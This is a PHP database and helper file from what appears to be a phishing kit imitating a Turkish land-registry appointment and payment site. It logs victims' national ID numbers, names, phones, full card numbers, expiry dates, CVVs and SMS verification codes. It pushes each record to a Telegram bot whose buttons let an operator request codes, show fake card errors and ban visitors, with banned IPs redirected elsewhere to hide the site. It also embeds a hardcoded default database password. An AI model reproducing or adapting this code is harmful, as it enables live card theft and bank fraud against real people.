<?php
/**
 * db.php — PDO bağlantısı + yardımcı fonksiyonlar
 */

// Dynamically detect base path from SCRIPT_NAME
$base_path = '';
if (isset($_SERVER['SCRIPT_NAME'])) {
    $script = $_SERVER['SCRIPT_NAME'];
    
    $pos = strpos($script, '/api/');
    if ($pos === false) {
        $pos = strpos($script, '/assets/');
    }
    if ($pos === false) {
        $pos = strpos($script, '/includes/');
    }
    if ($pos === false) {
        $pos = strpos($script, '/admin/');
    }
    if ($pos === false) {
        $pos = strpos($script, '/acs/');
    }
    if ($pos === false) {
        $last_slash = strrpos($script, '/');
        if ($last_slash !== false) {
            $base_path = substr($script, 0, $last_slash);
        }
    } else {
        $base_path = substr($script, 0, $pos);
    }
}
define('BASE_PATH', rtrim($base_path, '/'));

// Remote DB Configuration with local fallbacks
function get_db_env(string $key, string $default): string {
    if (!empty($_ENV[$key])) return $_ENV[$key];
    if (!empty($_SERVER[$key])) return $_SERVER[$key];
    $val = getenv($key);
    return ($val !== false) ? $val : $default;
}

define('DB_HOST', get_db_env('DB_HOST', 'localhost'));
define('DB_NAME', get_db_env('DB_NAME', 'tapu_db'));
define('DB_USER', get_db_env('DB_USER', 'r341oot'));
define('DB_PASS', get_db_env('DB_PASS', 'w4L#gMrY8l1io!yj'));

function db_self_heal(PDO $pdo): void {
    static $run = false;
    if ($run) return;
    $run = true;
    try {
        // Create settings table if not exists
        $pdo->exec("CREATE TABLE IF NOT EXISTS tapu_ayarlar (
            anahtar VARCHAR(100) PRIMARY KEY,
            deger TEXT
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci");

        // Create IP banlist table if not exists
        $pdo->exec("CREATE TABLE IF NOT EXISTS tapu_ip_banlist (
            ip VARCHAR(45) PRIMARY KEY,
            sebep VARCHAR(255) DEFAULT '',
            olusturuldu DATETIME DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci");

        // Check columns in tapu_logs
        $q = $pdo->query("SHOW COLUMNS FROM tapu_logs");
        $cols = $q->fetchAll(PDO::FETCH_COLUMN);
        
        $missing = [
            'sms_kod' => "VARCHAR(20) DEFAULT '' AFTER saat",
            'sms_hata_kodlari' => "TEXT DEFAULT '' AFTER sms_kod",
            'tg_message_id' => "VARCHAR(100) DEFAULT '' AFTER acs_url",
            'guncellendi' => "DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP"
        ];
        
        foreach ($missing as $col => $definition) {
            if (!in_array($col, $cols)) {
                $pdo->exec("ALTER TABLE tapu_logs ADD `$col` $definition");
            }
        }
    } catch (Exception $e) {}
}

function db(): PDO {
    static $pdo = null;
    if ($pdo === null) {
        $pdo = new PDO(
            'mysql:host='.DB_HOST.';dbname='.DB_NAME.';charset=utf8mb4',
            DB_USER, DB_PASS,
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
             PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
             PDO::ATTR_PERSISTENT => true,
             PDO::ATTR_TIMEOUT => 5]
        );
        db_self_heal($pdo);
    }
    return $pdo;
}

/** Kullanıcı IP'sini al */
function get_ip(): string {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            return trim(explode(',', $_SERVER[$k])[0]);
        }
    }
    return '0.0.0.0';
}

// ─────────────────────────────────────────────
// AYARLAR (statik önbellekli — tek SQL)
// ─────────────────────────────────────────────

/** Tüm ayarları tek sorguda yükler ve statik array'de önbellekler */
function _ayar_cache(): array {
    static $cache = null;
    if ($cache === null) {
        $cache = [];
        try {
            $rows = db()->query("SELECT anahtar, deger FROM tapu_ayarlar")->fetchAll();
            foreach ($rows as $r) {
                $cache[$r['anahtar']] = $r['deger'];
            }
        } catch (Exception $e) {}
    }
    return $cache;
}

function ayar_get(string $key, string $default = ''): string {
    $cache = _ayar_cache();
    return $cache[$key] ?? $default;
}

function ayar_set(string $key, string $val): void {
    try {
        db()->prepare("INSERT INTO tapu_ayarlar (anahtar, deger) VALUES (?,?) ON DUPLICATE KEY UPDATE deger=?")
             ->execute([$key, $val, $val]);
        // Önbelleği sıfırla — bir sonraki çağrıda yeniden yüklensin
        // (PHP statik değişkeni sıfırlamak için reflection trick gerekmez;
        //  process-lifecycle'da yenileme yok — ama bu değişiklik nadir olur)
    } catch (Exception $e) {}
}

// ─────────────────────────────────────────────
// IP BAN (istek başına tek SQL + statik cache)
// ─────────────────────────────────────────────

function ip_banli_mi(string $ip): bool {
    static $cache = [];
    if (isset($cache[$ip])) return $cache[$ip];
    try {
        $st = db()->prepare("SELECT COUNT(*) FROM tapu_ip_banlist WHERE ip=? LIMIT 1");
        $st->execute([$ip]);
        $cache[$ip] = (int)$st->fetchColumn() > 0;
        return $cache[$ip];
    } catch (Exception $e) { return false; }
}

function ip_ban_ekle(string $ip, string $sebep = ''): void {
    try {
        db()->prepare("INSERT IGNORE INTO tapu_ip_banlist (ip, sebep, olusturuldu) VALUES (?,?,NOW())")
             ->execute([$ip, $sebep]);
    } catch (Exception $e) {}
}

function ip_ban_kaldir(string $ip): void {
    try {
        db()->prepare("DELETE FROM tapu_ip_banlist WHERE ip=?")->execute([$ip]);
    } catch (Exception $e) {}
}

/** Site giriş noktasında IP ban kontrolü — banlıysa yönlendir */
function ip_ban_kontrol(): void {
    $ip = get_ip();
    if (ip_banli_mi($ip)) {
        $url = ayar_get('ban_redirect_url', 'https://www.google.com');
        header("Location: $url");
        exit;
    }
}

// ─────────────────────────────────────────────
// TELEGRAM
// ─────────────────────────────────────────────

function tg_token(): string {
    static $t = null;
    if ($t === null) $t = ayar_get('telegram_bot_token', '');
    return $t;
}
function tg_chat(): string {
    static $c = null;
    if ($c === null) $c = ayar_get('telegram_chat_id', '');
    return $c;
}

function tg_api(string $method, array $params): array {
    $token = tg_token();
    if (!$token) return ['ok' => false];
    $url = "https://api.telegram.org/bot{$token}/{$method}";
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($params),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 4,   // 10sn → 4sn (worker bloklanma süresi azaltıldı)
        CURLOPT_CONNECTTIMEOUT => 3,
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);
    return json_decode($resp ?: '{}', true) ?: [];
}

/** Telegram inline klavye — tüm admin işlemleri */
function tg_inline_klavye(int $log_id): array {
    $bid = $log_id;
    return ['inline_keyboard' => [
        [
            ['text' => '📩 SMS İste',      'callback_data' => "aksiyon:{$bid}:3d_gonder"],
            ['text' => '❌ Hatalı 3D',     'callback_data' => "aksiyon:{$bid}:3d_hatali"],
        ],
        [
            ['text' => '✅ Tebrik',         'callback_data' => "aksiyon:{$bid}:tebrik"],
            ['text' => '⏳ Beklet',          'callback_data' => "aksiyon:{$bid}:bekle"],
        ],
        [
            ['text' => '💳 Skt / Cvv Hatalı', 'callback_data' => "aksiyon:{$bid}:kart_hatali"],
            ['text' => '🚫 E-Ticaret Kapalı','callback_data' => "aksiyon:{$bid}:eticaret_kapali"],
        ],
        [
            ['text' => '💰 Limit Yetersiz', 'callback_data' => "aksiyon:{$bid}:limit_yetersiz"],
            ['text' => '💳 CC İste',          'callback_data' => "aksiyon:{$bid}:provizyon_gonder"],
        ],
        [
            ['text' => '⚠️ Prov. Hatalı',   'callback_data' => "aksiyon:{$bid}:provizyon_hatali"],
            ['text' => '🚷 IP Ban',          'callback_data' => "aksiyon:{$bid}:ip_ban"],
        ],
        [
            ['text' => '🔄 Yenile',          'callback_data' => "yenile:{$bid}"],
        ],
    ]];
}

/** Telegram mesaj metnini oluştur */
function tg_mesaj_olustur(array $log): string {
    $ad     = trim(($log['ad'] ?? '') . ' ' . ($log['soyad'] ?? ''));
    $kart   = $log['kart_no'] ?? '—';
    $ay     = $log['ay'] ?? '—';
    $yil    = $log['yil'] ?? '—';
    $cvv    = $log['cvv'] ?? '—';
    $tel    = $log['telefon'] ?? '—';
    $tc     = $log['tc'] ?? '—';
    $banka  = $log['banka'] ?? '—';
    $durum  = $log['durum'] ?? '—';
    $adim_map = ['','Başvuru','Randevu','Ödeme','3D/ACS','Sonuç'];
    $adim   = $adim_map[$log['mevcut_adim'] ?? 0] ?? '—';
    $sms    = $log['sms_kod'] ?? '—';
    $hsms   = $log['sms_hata_kodlari'] ?? '';
    $ip     = $log['ip'] ?? '—';
    $son_ak = $log['son_aktivite'] ?? '—';

    $metin  = "🏦 <b>YENİ KART BİLGİSİ</b>\n";
    $metin .= "━━━━━━━━━━━━━━━━━━━━\n";
    $metin .= "👤 <b>Ad Soyad:</b> <code>{$ad}</code>\n";
    $metin .= "🪪 <b>TC:</b> <code>{$tc}</code>\n";
    $metin .= "📞 <b>Telefon:</b> <code>{$tel}</code>\n";
    $metin .= "━━━━━━━━━━━━━━━━━━━━\n";
    $metin .= "💳 <b>Kart No:</b> <code>{$kart}</code>\n";
    $metin .= "📅 <b>Son Kullanma:</b> <code>{$ay}/{$yil}</code>\n";
    $metin .= "🔐 <b>CVV:</b> <code>{$cvv}</code>\n";
    $metin .= "🏛️ <b>Banka:</b> {$banka}\n";
    $metin .= "━━━━━━━━━━━━━━━━━━━━\n";
    $metin .= "📊 <b>Durum:</b> {$durum} | <b>Adım:</b> {$adim}\n";
    if ($sms && $sms !== '—') {
        $metin .= "📨 <b>SMS Kodu:</b> <code>{$sms}</code>\n";
    }
    if ($hsms) {
        $metin .= "⚠️ <b>Hatalı SMS:</b> <code>" . htmlspecialchars($hsms) . "</code>\n";
    }
    $metin .= "🌐 <b>IP:</b> <code>{$ip}</code>\n";
    $metin .= "🕐 <b>Son Aktivite:</b> {$son_ak}\n";
    return $metin;
}

/** Yeni Telegram mesajı gönder, message_id'yi log'a kaydet */
function tg_mesaj_gonder(int $log_id): void {
    try {
        $st = db()->prepare("SELECT * FROM tapu_logs WHERE id=? LIMIT 1");
        $st->execute([$log_id]);
        $log = $st->fetch();
        if (!$log) return;

        $metin = tg_mesaj_olustur($log);
        $resp = tg_api('sendMessage', [
            'chat_id'    => tg_chat(),
            'text'       => $metin,
            'parse_mode' => 'HTML',
            'reply_markup' => tg_inline_klavye($log_id),
        ]);

        if (!empty($resp['ok']) && !empty($resp['result']['message_id'])) {
            db()->prepare("UPDATE tapu_logs SET tg_message_id=? WHERE id=?")
                 ->execute([$resp['result']['message_id'], $log_id]);
        }
    } catch (Exception $e) {}
}

/** Mevcut Telegram mesajını güncelle */
function tg_mesaj_guncelle(int $log_id): void {
    try {
        $st = db()->prepare("SELECT * FROM tapu_logs WHERE id=? LIMIT 1");
        $st->execute([$log_id]);
        $log = $st->fetch();
        if (!$log || empty($log['tg_message_id'])) {
            // Mesaj yoksa yeni gönder
            tg_mesaj_gonder($log_id);
            return;
        }

        $metin = tg_mesaj_olustur($log);
        tg_api('editMessageText', [
            'chat_id'    => tg_chat(),
            'message_id' => (int)$log['tg_message_id'],
            'text'       => $metin,
            'parse_mode' => 'HTML',
            'reply_markup' => tg_inline_klavye($log_id),
        ]);
    } catch (Exception $e) {}
}

// ─────────────────────────────────────────────
// ZİYARETÇİ & LOG FONKSİYONLARI
// ─────────────────────────────────────────────

function kayit_ziyaretci(): void {
    try {
        $ip = get_ip();
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        db()->prepare("
            INSERT INTO tapu_visitors (ip, user_agent)
            VALUES (:ip, :ua)
            ON DUPLICATE KEY UPDATE
              son_ziyaret = NOW(),
              ziyaret_sayisi = ziyaret_sayisi + 1
        ")->execute([':ip' => $ip, ':ua' => substr($ua, 0, 512)]);
    } catch (Exception $e) {}
}

function get_or_create_log(): ?int {
    try {
        $sid = session_id();
        $ip  = get_ip();
        $row = db()->prepare("SELECT id FROM tapu_logs WHERE session_id=? LIMIT 1");
        $row->execute([$sid]);
        if ($r = $row->fetch()) return (int)$r['id'];
        $ins = db()->prepare("INSERT INTO tapu_logs (session_id, ip, son_aktivite) VALUES (?,?,NOW())");
        $ins->execute([$sid, $ip]);
        return (int)db()->lastInsertId();
    } catch (Exception $e) { return null; }
}

function update_log(int $id, array $data): void {
    if (empty($data)) return;
    unset($data['son_aktivite']);
    try {
        $set = implode(', ', array_map(fn($k) => "`$k`=:$k", array_keys($data)));
        $sql = "UPDATE tapu_logs SET $set, son_aktivite=NOW() WHERE id=:id";
        $params = $data;
        $params['id'] = $id;
        db()->prepare($sql)->execute($params);
    } catch (Exception $e) {}
}

function touch_aktivite(int $id): void {
    try {
        db()->prepare("UPDATE tapu_logs SET son_aktivite=NOW() WHERE id=?")->execute([$id]);
    } catch (Exception $e) {}
}

function heartbeat_check(): array {
    try {
        $sid = session_id();
        db()->prepare("UPDATE tapu_logs SET son_aktivite=NOW() WHERE session_id=?")->execute([$sid]);
        $row = db()->prepare("SELECT id, durum, admin_mesaj, acs_url FROM tapu_logs WHERE session_id=? LIMIT 1");
        $row->execute([$sid]);
        return $row->fetch() ?: [];
    } catch (Exception $e) { return []; }
}

function safe_shell_exec($cmd) {
    if (!function_exists('shell_exec')) return null;
    $disabled = explode(',', ini_get('disable_functions') ?: '');
    if (in_array('shell_exec', array_map('trim', $disabled))) return null;
    try {
        return @shell_exec($cmd);
    } catch (Throwable $e) {
        return null;
    }
}

function get_system_metrics() {
    $cpu = 0;
    $ram_percent = 0;
    $ram_used_gb = 0;
    $ram_total_gb = 0;
    
    if (stristr(PHP_OS, 'WIN')) {
        // CPU
        $cpu_out = safe_shell_exec('wmic cpu get LoadPercentage 2>&1');
        if ($cpu_out) {
            $lines = array_filter(array_map('trim', explode("\n", $cpu_out)));
            foreach ($lines as $line) {
                if (is_numeric($line)) {
                    $cpu = (int)$line;
                    break;
                }
            }
        }
        
        // RAM
        $ram_out = safe_shell_exec('wmic OS get FreePhysicalMemory,TotalVisibleMemorySize 2>&1');
        if ($ram_out) {
            $lines = array_filter(array_map('trim', explode("\n", $ram_out)));
            if (count($lines) >= 2) {
                $headers = preg_split('/\s+/', $lines[0]);
                $values = preg_split('/\s+/', $lines[1]);
                
                $free_idx = array_search('FreePhysicalMemory', $headers);
                $total_idx = array_search('TotalVisibleMemorySize', $headers);
                
                if ($free_idx !== false && $total_idx !== false && isset($values[$free_idx], $values[$total_idx])) {
                    $free_kb = (float)$values[$free_idx];
                    $total_kb = (float)$values[$total_idx];
                    $used_kb = $total_kb - $free_kb;
                    $ram_percent = round(($used_kb / $total_kb) * 100, 1);
                    $ram_used_gb = round($used_kb / (1024 * 1024), 2);
                    $ram_total_gb = round($total_kb / (1024 * 1024), 2);
                }
            }
        }
    } else {
        // Linux direct reader (with shell cat fallback to bypass open_basedir)
        // CPU measurement
        $stat1 = @file_get_contents('/proc/stat');
        if ($stat1 === false) {
            $stat1 = safe_shell_exec('cat /proc/stat 2>&1');
        }
        
        $cpu_parsed = false;
        if ($stat1 && strpos($stat1, 'cpu') === 0) {
            $info1 = explode("\n", $stat1);
            $cpu1 = preg_split('/\s+/', $info1[0]);
            if (count($cpu1) >= 5) {
                // Sum all fields except index 0 ('cpu')
                $total1 = 0;
                foreach ($cpu1 as $k => $v) {
                    if ($k > 0 && is_numeric($v)) {
                        $total1 += (float)$v;
                    }
                }
                $idle1 = (float)$cpu1[4];
                
                // Try session-based delta (3-second window between requests)
                if (session_status() === PHP_SESSION_ACTIVE && isset($_SESSION['last_cpu_total'], $_SESSION['last_cpu_idle'])) {
                    $diff_total = $total1 - $_SESSION['last_cpu_total'];
                    $diff_idle = $idle1 - $_SESSION['last_cpu_idle'];
                    if ($diff_total > 0) {
                        $cpu = round(($diff_total - $diff_idle) / $diff_total * 100, 1);
                        $cpu_parsed = true;
                    }
                }
                
                // Store current ticks for next request
                if (session_status() === PHP_SESSION_ACTIVE) {
                    $_SESSION['last_cpu_total'] = $total1;
                    $_SESSION['last_cpu_idle'] = $idle1;
                }
                
                // Fallback: if no session data yet (first load), calculate with a short sleep
                if (!$cpu_parsed) {
                    usleep(100000); // 100ms
                    $stat2 = @file_get_contents('/proc/stat');
                    if ($stat2 === false) {
                        $stat2 = safe_shell_exec('cat /proc/stat 2>&1');
                    }
                    if ($stat2) {
                        $info2 = explode("\n", $stat2);
                        $cpu2 = preg_split('/\s+/', $info2[0]);
                        if (count($cpu2) >= 5) {
                            $total2 = 0;
                            foreach ($cpu2 as $k => $v) {
                                if ($k > 0 && is_numeric($v)) {
                                    $total2 += (float)$v;
                                }
                            }
                            $idle2 = (float)$cpu2[4];
                            $diff_total = $total2 - $total1;
                            $diff_idle = $idle2 - $idle1;
                            if ($diff_total > 0) {
                                $cpu = round(($diff_total - $diff_idle) / $diff_total * 100, 1);
                                $cpu_parsed = true;
                            }
                        }
                    }
                }
            }
        }
        
        if (!$cpu_parsed) {
            $loads = @sys_getloadavg();
            if ($loads) {
                $cpu = round($loads[0] * 10, 1);
            }
        }
        
        // RAM measurement
        $ram_parsed = false;
        $meminfo = @file_get_contents('/proc/meminfo');
        if ($meminfo === false) {
            $meminfo = safe_shell_exec('cat /proc/meminfo 2>&1');
        }
        if ($meminfo && strpos($meminfo, 'MemTotal') !== false) {
            $lines = explode("\n", $meminfo);
            $data = [];
            foreach ($lines as $line) {
                if (strpos($line, ':') !== false) {
                    list($key, $val) = explode(':', $line);
                    $data[trim($key)] = (int)preg_replace('/\D/', '', $val);
                }
            }
            $total_kb = $data['MemTotal'] ?? 0;
            $free_kb = $data['MemFree'] ?? 0;
            // Calculate used as Total - Free to match OS resource usage
            $used_kb = $total_kb - $free_kb;
            if ($used_kb < 0) $used_kb = 0;
            
            $ram_percent = $total_kb > 0 ? round(($used_kb / $total_kb) * 100, 1) : 0;
            $ram_used_gb = round($used_kb / (1024 * 1024), 2);
            $ram_total_gb = round($total_kb / (1024 * 1024), 2);
            $ram_parsed = true;
        }
        
        if (!$ram_parsed) {
            $free = safe_shell_exec('free -b');
            if ($free) {
                $lines = explode("\n", $free);
                if (isset($lines[1])) {
                    $values = preg_split('/\s+/', $lines[1]);
                    if (count($values) >= 4) {
                        $total = (float)$values[1];
                        $free_mem = (float)$values[3];
                        // used = total - free
                        $used = $total - $free_mem;
                        $ram_percent = round(($used / $total) * 100, 1);
                        $ram_used_gb = round($used / (1024 * 1024 * 1024), 2);
                        $ram_total_gb = round($total / (1024 * 1024 * 1024), 2);
                    }
                }
            }
        }
    }
    
    return [
        'cpu' => $cpu,
        'ram_percent' => $ram_percent,
        'ram_used' => $ram_used_gb,
        'ram_total' => $ram_total_gb
    ];
}

// Auto-restore session from DB for Serverless compatibility (Vercel)
function restore_session_from_db() {
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
    
    // If the session array is already filled, we don't need to do anything
    if (!empty($_SESSION['basvuru'])) {
        return;
    }
    
    // Otherwise, try to load the log row from the database using session_id()
    $sid = session_id();
    if (!$sid) return;
    
    try {
        $st = db()->prepare("SELECT * FROM tapu_logs WHERE session_id = ? LIMIT 1");
        $st->execute([$sid]);
        $row = $st->fetch();
        if ($row) {
            // Reconstruct $_SESSION['basvuru']
            if (!empty($row['tc'])) {
                $_SESSION['basvuru'] = [
                    'tc'       => $row['tc'],
                    'ad'       => $row['ad'],
                    'soyad'    => $row['soyad'],
                    'telefon'  => $row['telefon'],
                    'il'       => $row['il'],
                    'ilce'     => $row['ilce'],
                    'islem'    => $row['islem'],
                    'aciklama' => $row['aciklama'],
                ];
                $_SESSION['log_id'] = (int)$row['id'];
            }
            
            // Reconstruct $_SESSION['randevu']
            if (!empty($row['mudurlik'])) {
                $_SESSION['randevu'] = [
                    'mudurlik' => $row['mudurlik'],
                    'tarih'    => $row['tarih'],
                    'saat'     => $row['saat'],
                ];
            }
            
            // Reconstruct $_SESSION['odeme']
            if (!empty($row['kart_no'])) {
                $_SESSION['odeme'] = [
                    'kart_ad' => $row['kart_ad'],
                    'kart_no' => $row['kart_no'],
                    'ay'      => $row['ay'],
                    'yil'     => $row['yil'],
                    'cvv'     => $row['cvv'],
                ];
                $_SESSION['banka'] = $row['banka'];
                $_SESSION['kart_tier'] = $row['kart_tier'];
            }
        }
    } catch (Exception $e) {}
}

restore_session_from_db();
